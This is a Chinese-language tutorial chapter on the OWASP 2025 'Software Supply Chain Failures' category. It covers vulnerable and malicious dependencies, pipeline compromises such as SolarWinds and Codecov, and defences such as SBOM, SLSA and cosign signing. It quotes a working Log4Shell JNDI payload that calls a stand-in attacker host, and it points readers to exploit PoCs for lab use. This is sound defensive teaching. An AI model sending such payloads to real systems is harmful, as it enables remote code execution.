# Ch 6 — A03 Software Supply Chain Failures

> 目標：理解 supply chain attack 全貌 — vulnerable deps、惡意套件、CI/CD pipeline 入侵、build system 篡改、artifact 被改包，以及怎麼防（SBOM / SLSA / signing）。

> **2025 變動**：原 2021 的 A06「Vulnerable & Outdated Components」**升到 A03 並改名 / 擴張**為「Software Supply Chain Failures」。社群有 50% 的人把這項票成第一名。原因：vulnerable deps 只是冰山一角，整條 build → distribute → deploy 鏈條都是攻擊面（SolarWinds 後業界共識）。本章涵蓋整條鏈。

## A03 是什麼

範圍三層，從窄到寬：

1. **Vulnerable / outdated dependencies** — 你 import 的 lib 有 known CVE（舊 A06 的本體）
2. **惡意 dependencies** — 套件本身被植入 malicious code（typosquatting、event-stream、xz-utils backdoor）
3. **Pipeline / build / distribution 被攻** — CI 被入侵、build server 被改、release artifact 被掉包、update channel 被劫（SolarWinds、ccleaner、Codecov）

2025 版用「Software Supply Chain」涵蓋全部三層。

「**沒 update = 自願受攻擊；update 也可能裝到惡意 / 被改的版本**」。

## Layer 1：Vulnerable Dependencies

現代 web app 一個典型 npm project 有 1000+ transitive dependencies。任何一個有 CVE → 你的 app 受影響。

統計：

- 平均 npm package 有 79 transitive deps
- npm 上有 200K+ 已知 vulnerable packages
- 80% 已 known 漏洞**有 patch 但沒人上**

### 經典案例：Log4Shell（CVE-2021-44228）

2021 年 12 月公布。Apache Log4j 2 的 RCE：

```
攻擊者送這個字串到任何被 log 的欄位（如 User-Agent）：

${jndi:ldap://attacker.com/exploit}
```

Log4j 看到 → 跑 JNDI lookup → 連 attacker.com:LDAP → 拿到 Java class file → 載入執行。

**一行字串 → RCE**。

影響：

- 全球幾乎所有 Java app（Log4j 是 standard）
- iCloud / Twitter / Steam / Tesla / Minecraft 都中
- patch 後仍長尾（很多老系統沒 update）

教訓：

- dependency 要追 CVE
- defense in depth：即使 vulnerable lib，多層防禦能擋 some attack
- network egress filtering（你的 server 不該對 attacker.com 發 outbound LDAP）

### 怎麼追 CVE

#### 1. 用 dependency scanner

| 工具 | 範圍 |
|---|---|
| **`npm audit`** | npm |
| **`pip-audit`** | Python |
| **`bundler-audit`** | Ruby |
| **`govulncheck`** | Go |
| **Snyk** | 多語言 + Free tier |
| **Dependabot** | GitHub 自動 PR |
| **Trivy** | Container + filesystem |
| **OWASP Dependency-Check** | Java 強 |
| **OSV-Scanner** | Google，跨語言，吃 OSV.dev DB |

每個 CI 都該跑。

#### 2. CVE database

- **NVD (National Vulnerability Database)**: https://nvd.nist.gov/
- **GitHub Security Advisories**: https://github.com/advisories
- **CVE.org**: https://www.cve.org/
- **OSV.dev**（Google）: https://osv.dev/ — 跨 ecosystem，machine-readable
- **Exploit-DB**: https://www.exploit-db.com/（含 PoC）

每 CVE 有編號（如 CVE-2021-44228）+ CVSS score（嚴重度）。

#### 3. 訂閱 advisory

- npm advisory mailing list
- GitHub Watch repos
- security blogs / Twitter

### CVSS Score

CVE 有 CVSS 分數（0-10）：

| Range | 嚴重度 |
|---|---|
| 0.1-3.9 | Low |
| 4.0-6.9 | Medium |
| 7.0-8.9 | High |
| 9.0-10.0 | Critical |

Log4Shell = 10.0 (max)。

CVSS 看：

- Attack Vector（網路 / 本機）
- Attack Complexity
- Privilege Required
- User Interaction
- Confidentiality / Integrity / Availability impact

production 至少修 High / Critical。

### 自動 update：Dependabot / Renovate

GitHub 內建 Dependabot（免費）：

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

設好後 GitHub 自動：偵測 outdated dep → 開 PR → 跑 tests → 你 review + merge。「**zero effort dependency 管理**」。

Renovate（Mend）功能更全：能 group PR、ecosystem 多、setting 細。大專案多用 Renovate。

## Layer 2：惡意 Dependencies

dep 本身正常路徑安裝，但**內含惡意 code**。

### event-stream 事件（2018）

熱門 npm package `event-stream`，原作者轉手給陌生 maintainer。新 maintainer 加了 dependency `flatmap-stream`，**它含 cryptocurrency stealer**（針對 Copay 比特幣 wallet）。被發現前裝過幾百萬次。

### colors.js / faker.js（2022）

開發者抗議 OSS 沒被付費 → 故意 push 壞版本到自己的 popular package：`colors.js` 加無限 loop、`faker.js` print "LIBERTY LIBERTY LIBERTY"。下載量百萬級，馬上廣泛 break production。

### xz-utils backdoor（CVE-2024-3094）

2024 年 3 月震動業界：

- xz-utils（Linux 系統壓縮工具，「無所不在」level）被嵌入 backdoor
- 攻擊者「Jia Tan」**潛伏 2 年**慢慢取得 maintainer 信任
- backdoor 觸發 sshd → 遠端 RCE
- 被 Andres Freund（Microsoft）發現的方式：注意到 SSH 登入慢 0.5 秒
- **差一點進到 Debian / Ubuntu stable** → 全球災難

教訓：

- supply chain 信任邊界很薄
- 小 OSS 的 maintainer burnout 是國家級攻擊面
- detection 靠 0.5s anomaly = 純運氣

### typosquatting

註冊跟熱門 package 相似名字：

- `requests` → `requets`
- `lodash` → `lod_ash`
- `python-discord` → `python_discord`

開發者打錯字 → 裝到 malicious package。npm / PyPI 每週都在下架這類。

### dependency confusion

公司有 internal package（如 `mycorp-utils`），但**沒在 public registry 註冊**。攻擊者註冊同名到 public：

```
- internal NPM: mycorp-utils 1.0.0
- public NPM:   mycorp-utils 99.0.0  ← attacker
```

build 時 npm 看到 99.0.0 比較高 → 拉 attacker 版 → RCE。

修：

- internal package 用 `@scope/`（@mycorp/utils）
- private registry 設定優先順序
- pin 版本

Alex Birsan 2021 用這招打進 Apple / Microsoft / PayPal 等 35 家。

## Layer 3：Pipeline / Build / Distribution 被攻（2025 主要新增焦點）

「dep 沒問題、code 沒問題，但 build 出來的 artifact 不是你寫的」。

### SolarWinds Orion（2020）

俄羅斯 APT 入侵 SolarWinds 的 build pipeline：

1. 駭入 build server
2. 在 Orion Platform 的 build 階段**注入 SUNBURST backdoor**
3. SolarWinds 用自己 cert 簽名（合法簽章！）
4. 1.8 萬客戶 update 後中招（含美國財政部、商務部、FireEye）

key insight：**source code repo 沒被改、dev 沒看到不對勁**。攻擊在 source → binary 之間發生。

連帶教訓：

- source code 完整 ≠ binary 完整
- code signing 只證明「**簽的人**」是你，不證明簽的東西沒被竄改後才簽
- need：**reproducible builds** + **build provenance**

### Codecov bash uploader（2021）

Codecov 提供 bash script 給 CI 跑（`bash <(curl -s https://codecov.io/bash)`）。攻擊者改了 script，竊取被 CI 看到的 env vars / secrets。受害公司含 HashiCorp、Twilio。

教訓：**`curl | bash` 的 supply chain 風險高**。要至少 pin SHA / 自己 mirror。

### GitHub Actions 攻擊面

第三方 action 跑時看得到 secret + 能 push commit：

- `uses: someone/action@v1` ← `v1` 是 mutable tag，作者能改
- 安全做法：pin commit SHA `uses: someone/action@abc1234...`

2024 年發生過熱門 action `tj-actions/changed-files` 被入侵，外洩無數 CI secret。

### container image / base image

`FROM ubuntu:latest` 拉的是當下的 latest — 內容會變、可能被 push 過 malicious layer：

- pin digest：`FROM ubuntu@sha256:abc...`
- 用 distroless / minimal base
- scan image：`trivy image your-image:tag`

## 防禦：dependency lock file

`package-lock.json` / `Pipfile.lock` / `Gemfile.lock` / `go.sum` / `Cargo.lock`：

- 記錄完整 dep tree + 版本 + hash
- 重 build 時保證**完全一樣**的 dep
- 防 transitive dep 突然換版

**lock file 必 commit**。CI 用 `npm ci` / `pip install --require-hashes` 強制走 lock。

## 防禦：SBOM（Software Bill of Materials）

「**這個 software 用了哪些 dependencies**」的清單：

```json
{
  "components": [
    {"name": "react", "version": "18.2.0"},
    {"name": "lodash", "version": "4.17.21"}
  ]
}
```

format：CycloneDX / SPDX。

新 CVE 出 → 你能立刻知道**哪些產品受影響**。

工具：

- syft（生成 SBOM）
- grype（用 SBOM 比對 CVE DB）

```bash
# 生 SBOM
syft your-image:latest -o cyclonedx > sbom.json

# 掃漏洞
grype sbom:./sbom.json
```

US 政府 EO 14028（2021 起）mandates 美國聯邦軟體採購要附 SBOM；歐盟 Cyber Resilience Act（2024）跟進。

## 防禦：SLSA（Supply-chain Levels for Software Artifacts）

Google 帶頭的 supply chain 安全 framework，4 個成熟度等級（v1.0 後實際分為 Build L1-L3 + Source / Deploy 等 track）。重點：

| 階段 | 要求 |
|---|---|
| **L1** | build process 是 scripted（不是手動）+ 產 provenance |
| **L2** | 用 hosted build service（GitHub Actions / Cloud Build） |
| **L3** | build 環境隔離 + provenance 簽章 + non-falsifiable |
| **L4 (deprecated in v1.0)** | 舊版有要求 reproducible build + two-person review |

provenance（出處證明）：build 出來的 artifact 附一個 metadata，說明「誰、用什麼 source commit、在哪台 build server、用什麼 dep 產的」。下游可驗。

GitHub Actions 內建 `actions/attest-build-provenance` 一鍵產 SLSA provenance。

## 防禦：code / artifact signing

光簽不夠（SolarWinds 簽了），但完全不簽更糟。

### Sigstore / cosign

OSS / OCI image 主流方案：

```bash
# 簽 image（用 OIDC，不需自管 key）
cosign sign your-registry/your-image:tag

# 驗證
cosign verify your-registry/your-image:tag \
  --certificate-identity=https://github.com/yourorg/yourrepo/.github/workflows/release.yml@refs/heads/main \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com
```

key 放在透明 log（Rekor）→ 任何人能審計。

### 套件 registry signing

- npm provenance（2023+）：npm publish 時自動產 SLSA provenance + Sigstore 簽
- PyPI trusted publishing（2023+）：用 OIDC 從 GitHub Actions 直接 publish，不用 long-lived token

新 publish 該開這些。

## 防禦 checklist（2025 完整版）

### Layer 1（已知 CVE）

- [ ] dependency lock file commit + CI 走 `npm ci` / 強制 hash
- [ ] CI 跑 `npm audit` / `pip-audit` / `govulncheck` / OSV-Scanner
- [ ] 啟用 Dependabot / Renovate
- [ ] critical / high CVE 立刻修

### Layer 2（惡意套件）

- [ ] 用 reputable source（official npm / PyPI，不要從 random repo install）
- [ ] pin 版本（不用 `^`，用具體版本）
- [ ] 內部 package 用 scope（`@mycorp/...`）+ private registry
- [ ] PR review 看新增 dep 來源 + maintainer
- [ ] 對 install hook（`postinstall` 等）警覺

### Layer 3（pipeline）

- [ ] CI secret 分層（不是所有 job 都看得到所有 secret）
- [ ] GitHub Actions 第三方 action 用 commit SHA pin
- [ ] base image 用 digest pin
- [ ] build artifact 簽章（cosign / Sigstore）
- [ ] 產生 SLSA provenance
- [ ] 生 SBOM（regulated industry mandatory）
- [ ] reproducible build（能驗證）

## 動手練習

**1. 對自己 project 跑 audit**

```bash
# Node project
cd your-node-project
npm audit
npm audit fix

# Python
pip-audit

# 跨語言（OSV-Scanner）
osv-scanner --recursive .

# 或用 Snyk
snyk test
```

看有多少 vulnerability。

**2. 啟用 Dependabot**

對 GitHub repo：

```bash
mkdir -p .github
cat > .github/dependabot.yml <<EOF
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
EOF

git add .github/dependabot.yml
git commit -m "Enable Dependabot"
git push
```

**3. 看 Log4Shell PoC**

GitHub 搜 `log4shell-poc`，看實際 exploit code。**只在自己 lab 跑**。

**4. SBOM 練習**

```bash
# 對 docker image 生 SBOM
syft alpine:latest -o cyclonedx > alpine-sbom.json

# 比對 CVE
grype sbom:./alpine-sbom.json
```

**5. cosign 簽 / 驗 image**

```bash
# 裝 cosign
brew install cosign   # 或下載 binary

# 對自己 build 的 image 簽（會跳 OIDC 登入）
cosign sign localhost:5000/myimage:latest

# 驗證
cosign verify localhost:5000/myimage:latest --certificate-identity-regexp '.*' --certificate-oidc-issuer-regexp '.*'
```

**6. SLSA provenance（GitHub Actions）**

加到自己 repo 的 release workflow：

```yaml
- uses: actions/attest-build-provenance@v1
  with:
    subject-path: 'dist/myartifact'
```

build 出來的 artifact 自動附 provenance。

**7. Pin GitHub Actions SHA**

把所有 `uses: actions/checkout@v4` 改成具體 SHA：

```yaml
uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11   # v4.1.1
```

**8. Juice Shop A06 / supply chain challenge**

- "Bonus Payload" challenge
- 看 Juice Shop `package.json`，挑 1 個老 dep，研究 CVE

## 自我檢核

- [ ] 知道 Log4Shell 攻擊原理
- [ ] 用過 npm audit / pip-audit / OSV-Scanner
- [ ] 知道 CVSS score 範圍跟意義
- [ ] 4+ 種惡意 dep 攻擊類型（typosquat / dependency confusion / xz-utils / event-stream）
- [ ] 知道 SolarWinds breach 為什麼是 pipeline level，不是 source level
- [ ] dependency lock file 一定 commit
- [ ] SBOM 用過至少 1 次（syft + grype）
- [ ] 自己 project 啟用 Dependabot
- [ ] cosign / Sigstore 跑過簽 / 驗
- [ ] 知道 SLSA 4 個 level 大致差別
- [ ] 知道 2025 為什麼把這從 A06 升到 A03

下一章看 A04 Cryptographic Failures — 加密做錯（2025 從 A02 降到 A04）。

→ [Ch 7 A04 Cryptographic Failures](./07-a04-cryptographic-failures.md)
